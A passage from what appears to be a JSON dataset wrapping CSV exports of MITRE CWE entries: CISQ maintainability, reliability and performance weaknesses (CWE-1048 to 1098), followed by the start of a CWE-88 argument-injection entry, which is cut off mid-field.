vulnerability.\",::NATURE:ChildOf:CWE ID:1120:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-7::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-13::\",,\"\",\n1048,\"Invokable Control Element with Large Number of Outward Calls\",Base,Incomplete,\"The code contains callable control elements that contain an excessively large number of references to other application objects external to the context of the callable, i.e. a Fan-Out value that is excessively large.\",\"While the interpretation of excessively large Fan-Out value may vary for each product or developer, CISQ recommends a default of 5 referenced objects. This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-4::\",,\"\",\n1049,\"Excessive Data Query Operations in a Large Data Table\",Base,Incomplete,\"The product performs a data query with a large number of joins and sub-queries on a large data table.\",\"This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability. While the interpretation of large data table and large number of joins or sub-queries may vary for each product or developer, CISQ recommends a default of 1 million rows for a large data table, a default minimum of 5 joins, and a default minimum of 3 sub-queries.\",::NATURE:ChildOf:CWE ID:1176:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Performance::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCPEM:ENTRY ID:ASCPEM-PRF-4::\",,\"\",\n1050,\"Excessive Platform Resource Consumption within a Loop\",Base,Incomplete,\"The product has a loop body or loop condition that contains a control element that directly or indirectly consumes platform resources, e.g. messaging, sessions, locks, or file descriptors.\",\"This issue can make the product perform more slowly. If an attacker can influence the number of iterations in the loop, then this performance problem might allow a denial of service by consuming more platform resources than intended.\",::NATURE:ChildOf:CWE ID:405:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Performance::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCPEM:ENTRY ID:ASCPEM-PRF-8::\",,\"\",\n1051,\"Initialization with Hard-Coded Network Resource Configuration Data\",Base,Incomplete,\"The product initializes data using hard-coded values that act as network resource identifiers.\",\"This issue can prevent the product from running reliably, e.g. if it runs in an environment does not use the hard-coded network resource identifiers. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:1419:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-18::\",,\"\",\n1052,\"Excessive Use of Hard-Coded Literals in Initialization\",Base,Incomplete,\"The product initializes a data element using a hard-coded literal that is not a simple integer or static constant element.\",\"This issue makes it more difficult to modify or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1419:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-3::\",,\"\",\n1053,\"Missing Documentation for Design\",Base,Incomplete,\"The product does not have documentation that represents how it is designed.\",\"This issue can make it more difficult to understand and maintain the product. It can make it more difficult and time-consuming to detect and/or fix vulnerabilities.\",::NATURE:ChildOf:CWE ID:1059:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1054,\"Invocation of a Control Element at an Unnecessarily Deep Horizontal Layer\",Base,Incomplete,\"The code at one architectural layer invokes code that resides at a deeper layer than the adjacent layer, i.e., the invocation skips at least one layer, and the invoked code is not part of a vertical utility layer that can be referenced from any horizontal layer.\",\"This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1061:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-12::\",,\"\",\n1055,\"Multiple Inheritance from Concrete Classes\",Base,Incomplete,\"The product contains a class with inheritance from more than one concrete class.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1093:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-2::\",,\"\",\n1056,\"Invokable Control Element with Variadic Parameters\",Base,Incomplete,\"A named-callable or method control element has a signature that supports a variable (variadic) number of parameters or arguments.\",\"This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability. With variadic arguments, it can be difficult or inefficient for manual analysis to be certain of which function/method is being invoked.\",::NATURE:ChildOf:CWE ID:1120:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-8::\",,\"\",\n1057,\"Data Access Operations Outside of Expected Data Manager Component\",Base,Incomplete,\"The product uses a dedicated, central data manager component as required by design, but it contains code that performs data-access operations that do not use this data manager.\",\"This issue can make the product perform more slowly than intended, since the intended central data manager may have been explicitly optimized for performance or other quality characteristics. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:1061:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Performance::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCPEM:ENTRY ID:ASCPEM-PRF-11::\",,\"\",\n1058,\"Invokable Control Element in Multi-Thread Context with non-Final Static Storable or Member Element\",Base,Incomplete,\"The code contains a function or method that operates in a multi-threaded environment but owns an unsafe non-final static storable or member data element.\",\"This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:662:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:662:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:662:VIEW ID:1340:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-11::\",,\"\",\n1060,\"Excessive Number of Inefficient Server-Side Data Accesses\",Base,Incomplete,\"The product performs too many data queries without using efficient data processing functionality such as stored procedures.\",\"This issue can make the product perform more slowly due to computational expense. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability. While the interpretation of too many data queries may vary for each product or developer, CISQ recommends a default maximum of 5 data queries for an inefficient function/procedure.\",::NATURE:ChildOf:CWE ID:1120:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Performance::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCPEM:ENTRY ID:ASCPEM-PRF-9::\",,\"\",\n1062,\"Parent Class with References to Child Class\",Base,Incomplete,\"The code has a parent class that contains references to a child class, its methods, or its members.\",\"This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:1061:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-14::\",,\"\",\n1063,\"Creation of Class Instance within a Static Code Block\",Base,Incomplete,\"A static code block creates an instance of a class.\",\"This pattern identifies situations where a storable data element or member data element is initialized with a value in a block of code which is declared as static. This issue can make the product perform more slowly by performing initialization before it is needed. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:1176:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Performance::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCPEM:ENTRY ID:ASCPEM-PRF-1::\",,\"\",\n1064,\"Invokable Control Element with Signature Containing an Excessive Number of Parameters\",Base,Incomplete,\"The product contains a function, subroutine, or method whose signature has an unnecessarily large number of parameters/arguments.\",\"This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities. While the interpretation of large number of parameters. may vary for each product or developer, CISQ recommends a default maximum of 7 parameters/arguments.\",::NATURE:ChildOf:CWE ID:1120:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-13::\",,\"\",\n1065,\"Runtime Resource Management Control Element in a Component Built to Run on Application Servers\",Base,Incomplete,\"The product uses deployed components from application servers, but it also uses low-level functions/methods for management of resources, instead of the API provided by the application server.\",\"This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-5::\",,\"\",\n1066,\"Missing Serialization Control Element\",Base,Incomplete,\"The product contains a serializable data element that does not have an associated serialization method.\",\"This issue can prevent the product from running reliably, e.g. by triggering an exception. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability. As examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-2::\",,\"\",\n1067,\"Excessive Execution of Sequential Searches of Data Resource\",Base,Incomplete,\"The product contains a data query against an SQL table or view that is configured in a way that does not utilize an index and may cause sequential searches to be performed.\",\"This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:1176:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Performance::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCPEM:ENTRY ID:ASCPEM-PRF-5::\",,\"\",\n1068,\"Inconsistency Between Implementation and Documented Design\",Base,Incomplete,\"The implementation of the product is not consistent with the design as described within the relevant documentation.\",\"This issue makes it more difficult to maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1070,\"Serializable Data Element Containing non-Serializable Item Elements\",Base,Incomplete,\"The product contains a serializable, storable data element such as a field or member, but the data element contains member elements that are not serializable.\",\"This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability. As examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.\",::NATURE:ChildOf:CWE ID:1076:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-3::\",,\"\",\n1071,\"Empty Code Block\",Base,Incomplete,\"The source code contains a block that does not contain any code, i.e., the block is empty.\",\"Empty code blocks can occur in the bodies of conditionals, function or method definitions, exception handlers, etc. While an empty code block might be intentional, it might also indicate incomplete implementation, accidental code deletion, unexpected macro expansion, etc. For some programming languages and constructs, an empty block might be allowed by the syntax, but the lack of any behavior within the block might violate a convention or API in such a way that it is an error.\",::NATURE:ChildOf:CWE ID:1164:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1072,\"Data Resource Access without Use of Connection Pooling\",Base,Incomplete,\"The product accesses a data resource through a database without using a connection pooling capability.\",\"This issue can make the product perform more slowly, as connection pools allow connections to be reused without the overhead and time consumption of opening and closing a new connection. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:405:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Performance::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCPEM:ENTRY ID:ASCPEM-PRF-13::\",,\"\",\n1073,\"Non-SQL Invokable Control Element with Excessive Number of Data Resource Accesses\",Base,Incomplete,\"The product contains a client with a function or method that contains a large number of data accesses/queries that are sent through a data manager, i.e., does not use efficient database capabilities.\",\"This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability. While the interpretation of large number of data accesses/queries may vary for each product or developer, CISQ recommends a default maximum of 2 data accesses per function/method.\",::NATURE:ChildOf:CWE ID:405:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Performance::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCPEM:ENTRY ID:ASCPEM-PRF-10::\",,\"\",\n1074,\"Class with Excessively Deep Inheritance\",Base,Incomplete,\"A class has an inheritance level that is too high, i.e., it has a large number of parent classes.\",\"This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities. While the interpretation of large number of parent classes may vary for each product or developer, CISQ recommends a default maximum of 7 parent classes.\",::NATURE:ChildOf:CWE ID:1093:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-17::\",,\"\",\n1075,\"Unconditional Control Flow Transfer outside of Switch Block\",Base,Incomplete,\"The product performs unconditional control transfer (such as a goto) in code outside of a branching structure such as a switch block.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1120:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-1::\",,\"\",\n1079,\"Parent Class without Virtual Destructor Method\",Base,Incomplete,\"A parent class contains one or more child classes, but the parent class does not have a virtual destructor method.\",\"This issue can prevent the product from running reliably due to undefined or unexpected behaviors. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:1076:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-16::\",,\"\",\n1080,\"Source Code File with Excessive Number of Lines of Code\",Base,Incomplete,\"A source code file has too many lines of code.\",\"This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities. While the interpretation of too many lines of code may vary for each product or developer, CISQ recommends a default threshold value of 1000.\",::NATURE:ChildOf:CWE ID:1120:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-8::\",,\"\",\n1082,\"Class Instance Self Destruction Control Element\",Base,Incomplete,\"The code contains a class instance that calls the method or function to delete or destroy itself.\",\"For example, in C++, delete this will cause the object to delete itself. This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:1076:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-7::\",,\"\",\n1083,\"Data Access from Outside Expected Data Manager Component\",Base,Incomplete,\"The product is intended to manage data access through a particular data manager component such as a relational or non-SQL database, but it contains code that performs data access operations without using that component.\",\"When the product has a data access component, the design may be intended to handle all data access operations through that component. If a data access operation is performed outside of that component, then this may indicate a violation of the intended design. This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:1061:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-10::\",,\"\",\n1084,\"Invokable Control Element with Excessive File or Data Access Operations\",Base,Incomplete,\"A function or method contains too many operations that utilize a data manager or file resource.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities. While the interpretation of too many operations may vary for each product or developer, CISQ recommends a default maximum of 7 operations for the same data manager or file.\",::NATURE:ChildOf:CWE ID:405:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-14::\",,\"\",\n1085,\"Invokable Control Element with Excessive Volume of Commented-out Code\",Base,Incomplete,\"A function, method, procedure, etc. contains an excessive amount of code that has been commented out within its body.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities. While the interpretation of excessive volume may vary for each product or developer, CISQ recommends a default threshold of 2% of commented code.\",::NATURE:ChildOf:CWE ID:1078:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-6::\",,\"\",\n1086,\"Class with Excessive Number of Child Classes\",Base,Incomplete,\"A class contains an unnecessarily large number of children.\",\"This issue makes it more difficult to understand and maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities. While the interpretation of large number of children may vary for each product or developer, CISQ recommends a default maximum of 10 child classes.\",::NATURE:ChildOf:CWE ID:1093:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-18::\",,\"\",\n1087,\"Class with Virtual Method without a Virtual Destructor\",Base,Incomplete,\"A class contains a virtual method, but the method does not have an associated virtual destructor.\",\"This issue can prevent the product from running reliably, e.g. due to undefined behavior. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:1076:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-15::\",,\"\",\n1089,\"Large Data Table with Excessive Number of Indices\",Base,Incomplete,\"The product uses a large data table that contains an excessively large number of indices.\",\"This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability. While the interpretation of large data table and excessively large number of indices may vary for each product or developer, CISQ recommends a default threshold of 1000000 rows for a large table and a default threshold of 3 indices.\",::NATURE:ChildOf:CWE ID:405:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Performance::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCPEM:ENTRY ID:ASCPEM-PRF-6::\",,\"\",\n1090,\"Method Containing Access of a Member Element from Another Class\",Base,Incomplete,\"A method for a class performs an operation that directly accesses a member element from another class.\",\"This issue suggests poor encapsulation and makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1061:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-16::\",,\"\",\n1092,\"Use of Same Invokable Control Element in Multiple Architectural Layers\",Base,Incomplete,\"The product uses the same control element across multiple architectural layers.\",\"This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-10::\",,\"\",\n1094,\"Excessive Index Range Scan for a Data Resource\",Base,Incomplete,\"The product contains an index range scan for a large data table, but the scan can cover a large number of rows.\",\"This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability. While the interpretation of large data table and excessive index range may vary for each product or developer, CISQ recommends a threshold of 1000000 table rows and a threshold of 10 for the index range.\",::NATURE:ChildOf:CWE ID:405:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Performance::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCPEM:ENTRY ID:ASCPEM-PRF-7::\",,\"\",\n1095,\"Loop Condition Value Update within the Loop\",Base,Incomplete,\"The product uses a loop with a control flow condition based on a value that is updated within the body of the loop.\",\"This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1120:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-5::\",,\"\",\n1097,\"Persistent Storable Data Element without Associated Comparison Control Element\",Base,Incomplete,\"The product uses a storable data element that does not have all of the associated functions or methods that are necessary to support comparison.\",\"For example, with Java, a class that is made persistent requires both hashCode() and equals() methods to be defined. This issue can prevent the product from running reliably, due to incorrect or unexpected comparison results. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:1076:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:595:VIEW ID:1305:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-4::\",,\"\",\n1098,\"Data Element containing Pointer Item without Proper Copy Control Element\",Base,Incomplete,\"The code contains a data element with a pointer that does not have an associated copy or constructor method.\",\"This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\",::NATURE:ChildOf:CWE ID:1076:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Reliability::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-RLB-6::\",,\"\","
  },
  "doc-dca9717cd6905c8ff850db97475c3bef": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n88,\"Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')\",Base,Draft,\"The product constructs a string for a command to be executed by a separate component in another control sphere, but it does not properly delimit the intended arguments, options, or switches within that command string.\",\"When creating commands using interpolation into a string, developers may assume that only the arguments/options that they specify will be processed. This assumption may be even stronger when the programmer has encoded the command in a way that prevents separate commands from being provided maliciously, e.g. in the case of shell metacharacters. When constructing the command, the developer may use whitespace or other delimiters that are required to separate arguments when the command. However, if an attacker can provide an untrusted input that contains argument-separating delimiters, then the resulting command will have more arguments than intended by the developer. The attacker may then be able to change the behavior of the command. Depending on the functionality supported by the extraneous arguments, this may have security-relevant consequences.\",::NATURE:ChildOf:CWE ID:77:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1340:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Often::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Other:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Alter Execution Logic:IMPACT:Read Application Data:IMPACT:Modify Application Data:NOTE:An attacker could include arguments that allow unintended commands or code to be executed, allow sensitive data to be read or modified or could cause other unintended behavior.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, 